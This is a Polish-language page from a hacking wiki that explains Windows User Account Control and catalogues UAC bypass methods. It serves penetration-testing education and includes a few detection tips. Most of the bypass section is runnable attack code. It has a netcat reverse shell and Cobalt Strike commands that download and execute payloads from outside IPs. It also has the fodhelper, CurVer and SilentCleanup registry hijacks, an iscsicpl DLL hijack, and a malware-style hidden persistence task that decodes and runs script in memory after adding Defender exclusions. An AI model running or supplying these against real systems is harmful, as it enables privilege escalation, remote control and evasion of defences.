# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogłyby potencjalnie narazić system na kompromitację**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście bezpieczeństwa konta nieadministracyjnego**, chyba że administrator wyraźnie autoryzuje te aplikacje/zadania do uzyskania dostępu do systemu na poziomie administratora. Jest to funkcja wygody, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za granicę bezpieczeństwa.

Więcej informacji o poziomach integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywne, użytkownik będący administratorem otrzymuje 2 tokeny: token standardowego użytkownika do wykonywania zwykłych działań z poziomem medium integrity oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC, w tym proces logowania, doświadczenia użytkownika i architekturę UAC. Administratorzy mogą używać zasad zabezpieczeń do konfigurowania działania UAC na poziomie lokalnym, zgodnie z potrzebami organizacji (za pomocą secpol.msc), albo konfigurować je i wdrażać za pośrednictwem obiektów zasad grupy (GPO) w środowisku domenowym Active Directory. Poszczególne ustawienia zostały szczegółowo omówione [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można skonfigurować 10 ustawień zasad grupy. Poniższa tabela zawiera dodatkowe informacje:

| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru                | Ustawienie domyślne                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na bezpiecznym pulpicie) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o poświadczenia na bezpiecznym pulpicie)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Zasady instalowania oprogramowania w Windows

**Lokalne zasady zabezpieczeń** („secpol.msc” w większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym administratorami instalowanie oprogramowania**. Oznacza to, że nawet jeśli użytkownik niebędący administratorem może pobrać instalator oprogramowania, nie będzie mógł go uruchomić bez konta administratora.

### Klucze rejestru wymuszające monit UAC o podwyższenie uprawnień

Jako standardowy użytkownik bez uprawnień administratora możesz dopilnować, aby konto „standardowe” otrzymywało **monit UAC o podanie poświadczeń**, gdy próbuje wykonać określone działania. Wymagałoby to zmodyfikowania określonych **kluczy rejestru**, do czego potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** albo attacker jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, zmiany te wymuszają **ponowne wprowadzenie poświadczeń konta** w celu wykonania działań administracyjnych.

**W praktyce jest to przydatne tylko wtedy, gdy masz już elevated token, UAC bypass lub błędną konfigurację umożliwiającą zmianę tych kluczy; w przeciwnym razie sam zapis do rejestru zostanie zablokowany.**

Klucze rejestru i wpisy, które należy zmienić, są następujące (z wartościami domyślnymi w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to również wykonać ręcznie za pomocą narzędzia Local Security Policy. Po wprowadzeniu zmian operacje administracyjne wymagają od użytkownika ponownego wprowadzenia poświadczeń.

### Uwaga

**User Account Control nie jest granicą bezpieczeństwa.** Dlatego standardowi użytkownicy nie mogą wydostać się ze swoich kont i uzyskać uprawnień administratora bez wykorzystania local privilege escalation exploit.

### Poproś użytkownika o „pełny dostęp do komputera”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak przeglądarki internetowe) dostęp do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Osiąga się to przez uruchomienie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać atakom remote code execution, które mogłyby uzyskać dostęp do poufnych danych w systemie.
- Gdy użytkownik loguje się do Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę poświadczeń użytkownika, czyli poświadczeń używanych do uwierzytelniania użytkownika na komputerze oraz do zasobów w sieci.

### Autoadminlogon

Aby skonfigurować Windows do automatycznego logowania określonego użytkownika podczas uruchamiania, ustaw **`AutoAdminLogon registry key`**. Jest to przydatne w środowiskach kioskowych lub do celów testowych. Używaj tej funkcji wyłącznie w bezpiecznych systemach, ponieważ ujawnia ona hasło w rejestrze.

Ustaw następujące klucze za pomocą Registry Editor lub `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do ofiary, UAC bypass jest prosty, ponieważ możesz po prostu kliknąć „Yes”, gdy pojawi się monit UAC

UAC bypass jest potrzebny w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście o średnim poziomie integralności, a Twój użytkownik należy do grupy administratorów**.

Należy wspomnieć, że **znacznie trudniej jest wykonać UAC bypass, jeśli UAC działa na najwyższym poziomie zabezpieczeń (Always), niż jeśli działa na którymkolwiek z pozostałych poziomów (Default).**

### Fast triage from a medium-integrity shell

Przed próbą wykonania bypass potwierdź, że znajdujesz się w odpowiednim scenariuszu, i dopasuj build hosta do znanych działających metod:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktyczne uwagi:
- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / bypassów opartych na COM.
- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować dokładny build zamiast zakładać niepowodzenie: UACME nadal śledzi niektóre metody `AlwaysNotify compatible` na nowoczesnych buildach Windows.

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` wynosi **`0`**), możesz **wykonać reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Bardzo** podstawowy UAC "bypass" (pełny dostęp do systemu plików)

Jeśli masz shell z użytkownikiem należącym do grupy Administrators, możesz lokalnie zamontować współdzielony zasób **C$** przez SMB (system plików) jako nowy dysk i uzyskasz **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego użytkownika Administrator).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom zabezpieczeń
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** również mają kilka modułów do **bypass**owania **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated obiekty COM nadal stanowią praktyczną powierzchnię UAC na współczesnych buildach. `ICMLuaUtil` jest nadal oznaczany przez UACME jako działający w obecnych gałęziach Windows, a narzędzia ofensywne wciąż dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonywanie 64-bitowe i czasami podszywanie się pod PEB/proces przed wywołaniem COM Elevation Moniker.

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowa powłoka zawiedzie, ponów próbę z poziomu implementacji BOF / UACME zamiast naiwnego wrappera `CreateProcess`.
- Załóż, że wykonywanie procesu potomnego nastąpi w **oddzielnym procesie z podniesionymi uprawnieniami**; wiele BOF nie podnosi uprawnień bieżącego beacona bezpośrednio.

### KRBUACBypass

Dokumentacja i narzędzie są dostępne pod adresem [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), które jest **zbiorem** kilku exploitów UAC bypass. Pamiętaj, że musisz **skompilować UACME za pomocą Visual Studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (takich jak `Source\Akagi\outout\x64\Debug\Akagi.exe`), a Ty będziesz musiał wiedzieć, **którego potrzebujesz.**\
Należy zachować **ostrożność**, ponieważ niektóre bypasses będą **wyświetlać monity innych programów**, które **poinformują** **użytkownika**, że coś się dzieje.

UACME zawiera **wersję builda, od której każda technika zaczęła działać**. Możesz wyszukać technikę wpływającą na używane przez Ciebie wersje:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, korzystając z [tej](https://en.wikipedia.org/wiki/Windows_10_version_history) strony, można określić wersję wydania Windows `1607` na podstawie numerów kompilacji.

Praktyczny przebieg pracy polega na tym, aby najpierw **ocenić kompilację hosta**, a dopiero potem uruchomić pasującą metodę:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co pozwala szybko odrzucić nieaktualne PoC.
- `UACME` nadal pozostaje najlepszym publicznym katalogiem do mapowania bypassu na konkretny build. Najnowsze wydania dodały nowe metody i ponownie przetestowały istniejące na **Windows 11 25H2**, dlatego przed założeniem, że stary wpis na blogu nadal ma zastosowanie bez zmian, sprawdź ponownie README i informacje o wydaniu.

### UAC Bypass – fodhelper.exe (przejęcie rejestru)

Zaufany plik binarny `fodhelper.exe` jest automatycznie uruchamiany z podwyższonymi uprawnieniami w nowoczesnym Windows. Po uruchomieniu odpy tuje poniższą ścieżkę rejestru użytkownika bez sprawdzania czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie Medium Integrity (użytkownik należy do grupy Administrators) uruchomić proces o poziomie High Integrity bez monitu UAC.

Ścieżka rejestru odpytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki w PowerShellu (ustaw payload, a następnie go uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators, a poziom UAC jest ustawiony domyślnie/łagodnie (nie na Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżka do pliku EXE). Aby zachować stealth, unikaj interfejsów UI wyświetlających monity.

#### Wariant hijack CurVer/extension (tylko HKCU)

Nowsze samples wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Auto-elevated binary nadal wyszukuje handler w `HKCU`, więc do utworzenia kluczy nie jest wymagany token administratora:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania mające na celu uniknięcie detekcji (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z wysokim poziomem integralności. Typowe zadanie persistence przechowuje na dysku **XOR-encrypted PowerShell script**, a następnie co godzinę dekoduje go i wykonuje w pamięci:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ten wariant nadal usuwa dropper i pozostawia wyłącznie staged payloads, przez co wykrywanie wymaga monitorowania **hijack `CurVer`**, manipulowania wartością `ConsentPromptBehaviorAdmin`, tworzenia wykluczeń w Defenderze lub scheduled tasks, które deszyfrują PowerShell w pamięci.

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać high integrity bez okna zgody. Ta metoda nadal jest warta testowania na nowszych buildach, ponieważ UACME utrzymuje tę technikę aktywną, a najnowsze zgłoszenia wskazują, że Windows 11 24H2 może wymagać jedynie niewielkich korekt cudzysłowów.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If zadanie cytuje ścieżkę w tej kompilacji, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Zawsze usuń `HKCU\Environment\windir` po zakończeniu testów.

#### Więcej UAC bypass

Wiele klasycznych UAC bypass, które wykorzystują przepływy interfejsu użytkownika, obiekty COM lub interakcję z pulpitem, wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub service działający w **Session 0** często nie wystarcza.

Często można rozwiązać ten problem za pomocą sesji **meterpreter**. Wykonaj migrację do **process**, którego wartość **Session** wynosi **1**:

![Wskaż ms-settings na niestandardowe rozszerzenie (.thm) i przypisz to rozszerzenie do naszego payloadu - Więcej UAC bypass: Możesz to uzyskać za pomocą sesji meterpreter. Wykonaj migrację do process, którego wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinien działać)

### UAC Bypass z GUI

Jeśli masz dostęp do **GUI, możesz po prostu zaakceptować monit UAC**, gdy się pojawi; tak naprawdę nie potrzebujesz technicznego bypassu. Dlatego uzyskanie sesji GUI często wystarcza, aby ominąć praktyczne utrudnienia dodane przez UAC.

Ponadto, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), **niektóre narzędzia będą uruchomione jako administrator**, dzięki czemu możesz **uruchomić** na przykład **cmd** bezpośrednio **jako admin**, bez ponownego wyświetlania monitu UAC, tak jak w przypadku [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Głośny brute-force UAC bypass

Jeśli nie zależy Ci na zachowaniu ciszy, zawsze możesz **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), co **prosi o podniesienie uprawnień, dopóki użytkownik tego nie zaakceptuje**.

### Własny bypass - podstawowa metodologia UAC bypass

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele UAC bypass wykorzystuje DLL hijacking** (często poprzez sprawienie, aby podniesiony binary załadował kontrolowaną przez attackera DLL z zapisywalnej ścieżki). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź binary, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musieć **zapisać** DLL w niektórych **chronionych ścieżkach** (takich jak C:\Windows\System32), w których nie masz uprawnień zapisu. Możesz to obejść za pomocą:
1. **wusa.exe**: Windows 7,8 i 8.1. Pozwala wyodrębnić zawartość pliku CAB do chronionych ścieżek (ponieważ to narzędzie jest uruchamiane z wysokiego poziomu integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **script**, który skopiuje Twoją DLL do chronionej ścieżki i uruchomi podatny oraz autoelevated binary.

### Inna technika UAC bypass

Polega na sprawdzeniu, czy **autoElevated binary** próbuje **odczytać** z **registry** **nazwę/ścieżkę** **binary** lub **command**, który ma zostać **wykonany** (jest to ciekawsze, jeśli binary szuka tych informacji w **HKCU**).

### UAC bypass przez `SysWOW64\iscsicpl.exe` + DLL hijack użytkownika `PATH`

32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` to **auto-elevated** binary, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli możesz umieścić złośliwą `iscsiexe.dll` w **folderze zapisywalnym przez użytkownika**, a następnie zmodyfikować `PATH` bieżącego użytkownika (na przykład przez `HKCU\Environment\Path`), aby ten folder był przeszukiwany, Windows może załadować DLL attackera do podniesionego process `iscsicpl.exe` **bez wyświetlania monitu UAC**.

Uwagi praktyczne:
- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale działa na poziomie **Medium Integrity** z powodu UAC.
- Kopia w **SysWOW64** jest istotna dla tego bypassu. Potraktuj kopię w **System32** jako oddzielny binary i niezależnie zweryfikuj jej zachowanie.
- Primitive jest połączeniem **auto-elevation** i **DLL search-order hijacking**, dlatego ten sam workflow ProcMon, który jest używany w przypadku innych UAC bypass, jest przydatny do zweryfikowania brakującego ładowania DLL.

Minimalny przebieg:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Pomysły na wykrywanie:
- Generuj alerty dla `reg add` / zapisów do rejestru w `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Wyszukuj `iscsiexe.dll` w lokalizacjach **kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem DLL spoza standardowych katalogów Windows.

### Nowsze badania, które warto sprawdzić osobno

Niektóre łańcuchy z okresu po 2024 roku nie przypominają już klasycznych hijacków rejestru `HKCU\Software\Classes`. Przykładowo, poisoning activation-context cache może łączyć **remapowanie dysku** i **przekierowanie DLL**, aby przejść z poziomu medium do high integrity za pośrednictwem zaufanych interfejsów użytkownika / plików binarnych z auto-elevate, takich jak `ctfmon.exe`, a następnie celów takich jak `fodhelper.exe`. Zamiast duplikować tutaj obszerny PoC, sprawdź zwarte przykłady payloadów w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack litery dysku w Administrator Protection (25H2) za pośrednictwem mapy urządzeń DOS dla sesji logowania

Pełny attack surface `RAiLaunchAdminProcess` / UIAccess w Windows 11 25H2 opisano na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Funkcja „Administrator Protection” w Windows 11 25H2 używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` przypisanymi do sesji. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązywaniu `\??`. Jeśli attacker dokona impersonacji tokenu shadow-admin wyłącznie na poziomie **SecurityIdentification**, katalog zostanie utworzony z attackerem jako **ownerem** (dziedziczy `CREATOR OWNER`), co umożliwia tworzenie linków liter dysków mających pierwszeństwo przed `\GLOBAL??`.

**Kroki:**

1. Z sesji z niskimi uprawnieniami wywołaj `RAiProcessRunOnce`, aby uruchomić pozbawiony promptu proces shadow-admin `runonce.exe`.
2. Zduplikuj jego primary token jako token typu **identification** i dokonaj jego impersonacji podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z własnością attackera.
3. Utwórz tam symlink `C:` wskazujący na storage kontrolowany przez attackera; kolejne operacje systemu plików w tej sesji będą rozwiązywać `C:` do ścieżki attackera, umożliwiając DLL/file hijack bez wyświetlania promptu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referencje
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Zbiór technik omijania UAC](https://github.com/hfiref0x/UACME)
- [WinPwnage – skaner zgodności i launcher technik omijania UAC](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: wykorzystanie 0-day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Omijanie Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – Omijanie Administrator Protection przez nadużycie UI Access](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – Omijanie UAC za pomocą zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
